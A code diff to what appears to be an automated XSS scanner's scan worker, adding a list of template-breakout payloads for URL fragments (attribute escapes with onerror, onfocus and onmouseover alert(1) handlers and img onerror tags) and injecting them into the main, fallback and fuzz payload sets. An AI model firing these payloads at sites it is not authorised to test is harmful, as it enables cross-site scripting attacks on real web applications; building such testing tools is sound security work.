@@ -26,6 +26,21 @@ const SCAN_WORKER_CONCURRENCY = Math.max(
   Number(process.env.SCAN_WORKER_CONCURRENCY ?? 2),
 );
 
+/** Template-breakout payloads for __fragment__ auto-discovery.
+ *  These handle scenarios where the fragment value is concatenated into
+ *  an existing HTML template before DOM injection (e.g.
+ *  `jQuery.html('<tag>' + location.hash + '</tag>')`). Generic html_body
+ *  payloads (<script>…) land inside the quoted attribute and never execute. */
+const FRAGMENT_BREAKOUT_PAYLOADS: GeneratedPayload[] = [
+  { payload: "1' onerror='alert(1)", target_param: '__fragment__', context: 'attribute', confidence: 0.85, waf_bypass: false, technique: 'template_breakout', severity: 'high' },
+  { payload: '1" onerror="alert(1)', target_param: '__fragment__', context: 'attribute', confidence: 0.85, waf_bypass: false, technique: 'template_breakout', severity: 'high' },
+  { payload: "1'><img src=x onerror=alert(1)>", target_param: '__fragment__', context: 'attribute', confidence: 0.8, waf_bypass: false, technique: 'template_breakout', severity: 'high' },
+  { payload: '1"><img src=x onerror=alert(1)>', target_param: '__fragment__', context: 'attribute', confidence: 0.8, waf_bypass: false, technique: 'template_breakout', severity: 'high' },
+  { payload: "1' autofocus onfocus='alert(1)", target_param: '__fragment__', context: 'attribute', confidence: 0.75, waf_bypass: false, technique: 'template_breakout', severity: 'medium' },
+  { payload: '1" autofocus onfocus="alert(1)', target_param: '__fragment__', context: 'attribute', confidence: 0.75, waf_bypass: false, technique: 'template_breakout', severity: 'medium' },
+  { payload: '1 onmouseover=alert(1) //', target_param: '__fragment__', context: 'attribute', confidence: 0.7, waf_bypass: false, technique: 'template_breakout', severity: 'medium' },
+];
+
 function canonicalizeTargetUrl(
   rawUrl: string,
   baseUrl?: string,
@@ -514,9 +529,6 @@ export class ScanProcessor extends WorkerHost {
                 maxPayloads: scan.options.maxPayloadsPerParam ?? 50,
               });
               fragmentPayloads = genResp.payloads;
-              this.logger.log(
-                `fragment payload-gen: ${fragmentPayloads.length} payloads generated for ${targetUrl}`,
-              );
             } catch (err) {
               const detail =
                 err instanceof Error ? err.message : 'payload-gen error';
@@ -524,6 +536,16 @@ export class ScanProcessor extends WorkerHost {
                 `fragment payload-gen failed for ${targetUrl}: ${detail}`,
               );
             }
+
+            // Inject template-breakout payloads for scenarios where the
+            // fragment value is concatenated into an existing HTML template
+            // before DOM injection (e.g. jQuery.html('<tag>' + frag + '</tag>')).
+            // Generic fragment payloads assume direct innerHTML assignment,
+            // but real apps often wrap the hash in a template first.
+            fragmentPayloads = [...FRAGMENT_BREAKOUT_PAYLOADS, ...fragmentPayloads];
+            this.logger.log(
+              `fragment payloads: ${fragmentPayloads.length} total (${FRAGMENT_BREAKOUT_PAYLOADS.length} template-breakout + ${fragmentPayloads.length - FRAGMENT_BREAKOUT_PAYLOADS.length} generic) for ${targetUrl}`,
+            );
 
             if (fragmentPayloads.length > 0) {
               this.gateway.emitProgress({
@@ -783,6 +805,16 @@ export class ScanProcessor extends WorkerHost {
             Date.now() - contextStartedAt,
           );
 
+          // ── Inject template-breakout payloads for __fragment__ in fallback ──
+          if (targetParams.includes('__fragment__')) {
+            const existing = new Set(uniqueFallback.map(p => `${p.target_param}:${p.payload}`));
+            const toInject = FRAGMENT_BREAKOUT_PAYLOADS.filter(bp => !existing.has(`${bp.target_param}:${bp.payload}`));
+            uniqueFallback.unshift(...toInject);
+            this.logger.log(
+              `fragment fallback: injected ${toInject.length} template-breakout payloads for ${targetUrl}`,
+            );
+          }
+
           if (uniqueFallback.length > 0) {
             auditPayloadsByUrl[targetUrl] = {
               params: targetParams,
@@ -1021,6 +1053,19 @@ export class ScanProcessor extends WorkerHost {
           Date.now() - payloadGenStartedAt,
         );
 
+        // ── Inject template-breakout payloads for __fragment__ ─────
+        // When __fragment__ is a discovered param, prepend breakout payloads
+        // designed for template-wrap scenarios (e.g. `attr="prefix"+hash+"suffix"`)
+        // that generic html_body payloads cannot exploit.
+        if (targetParams.includes('__fragment__')) {
+          const existing = new Set(uniquePayloads.map(p => `${p.target_param}:${p.payload}`));
+          const toInject = FRAGMENT_BREAKOUT_PAYLOADS.filter(bp => !existing.has(`${bp.target_param}:${bp.payload}`));
+          uniquePayloads.unshift(...toInject);
+          this.logger.log(
+            `fragment: injected ${toInject.length} template-breakout payloads for ${targetUrl}`,
+          );
+        }
+
         // ── FUZZ for this URL ───────────────────────────────────────
         const fuzzStartedAt = Date.now();
         this.scannerLog.append(scanId, {
@@ -1047,7 +1092,11 @@ export class ScanProcessor extends WorkerHost {
 
         let results;
         try {
-          const contextEntries = Object.values(contexts);
+          const contextEntries = Object.values(contexts) as Array<{
+            reflects_in: string;
+            allowed_chars: string[];
+            context_confidence: number;
+          }>;
           const dominantContext =
             contextEntries.length > 0
               ? contextEntries[0].reflects_in
